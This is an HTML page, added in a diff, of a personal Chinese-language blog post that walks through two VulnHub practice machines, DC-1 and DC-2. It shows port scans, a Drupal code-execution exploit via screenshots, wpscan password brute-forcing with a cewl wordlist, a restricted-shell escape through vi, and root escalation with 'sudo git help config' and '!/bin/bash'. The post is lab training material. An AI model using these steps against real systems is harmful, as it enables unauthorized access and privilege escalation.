@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title> [vulnhub]DC-1/DC-2靶机 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title"> [vulnhub]DC-1/DC-2靶机</h2>
+            <div class="post-date">2020-02-06</div>
+            
+            <div class="post-content">
+              <p><strong>DC-1</strong><br>
+开放端口</p>
+<pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+38538/tcp open  status  1 (RPC #100024)
+</code></pre>
+<!-- more -->
+<p>看下80端口运行着什么<br>
+<img src="https://guokeya.github.io/post-images/1580988606297.png" alt="" loading="lazy"><br>
+druapl。十有八九有漏洞<br>
+<img src="https://guokeya.github.io/post-images/1580988673190.png" alt="" loading="lazy"><br>
+找到一个远程代码执行<br>
+<img src="https://guokeya.github.io/post-images/1580989167276.png" alt="" loading="lazy"><br>
+直接find提权<br>
+<img src="https://guokeya.github.io/post-images/1580989291269.png" alt="" loading="lazy"></p>
+<p><strong>DC-2</strong></p>
+<pre><code>PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+</code></pre>
+<p>80是个wordpress。直接wpscan<br>
+得到admin/jerry/tom三个用户。<br>
+<img src="https://guokeya.github.io/post-images/1580989505127.png" alt="" loading="lazy"><br>
+wordpress页面有提示。用cewl生成字典<br>
+<code>cewl http://dc-2/ -w pass.txt</code><br>
+<code>wpcan --url http://dc-2/ -U user.txt -P pass.txt</code><br>
+得到密码<br>
+<img src="https://guokeya.github.io/post-images/1580989677049.png" alt="" loading="lazy"><br>
+ssh登陆tom用户。结果发现是rbash(受限制的bash)<br>
+很多命令用不了<br>
+vi可以。读取了flag3.txt<br>
+<code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>
+没看出啥提示。<br>
+vi逃逸<br>
+vi<br>
+:set shell=/bin/bash<br>
+:shell<br>
+即可得到一个没限制的shell<br>
+添加下环境变量<br>
+export PATH=$PATH:/bin/<br>
+一直没思路。看了下writeup<br>
+su jerry用户<br>
+输入爆破出的密码就可以了。？？？？？<br>
+那之前我ssh为什么不能登陆<br>
+登陆上了</p>
+<pre><code>jerry@DC-2:~$ cat flag4.txt
+Good to see that you've made it this far - but you're not home yet. 
+
+You still need to get the final flag (the only flag that really counts!!!).  
+
+No hints here - you're on your own now.  :-)
+
+Go on - git outta here!!!!
+
+jerry@DC-2:~$ 
+
+</code></pre>
+<p>git提权<br>
+sudo git help config<br>
+!/bin/bash</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/vulnhubsunrise-ba-ji/">
+                  <h3 class="post-title">
+                     [vulnhub]sunrise靶机
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
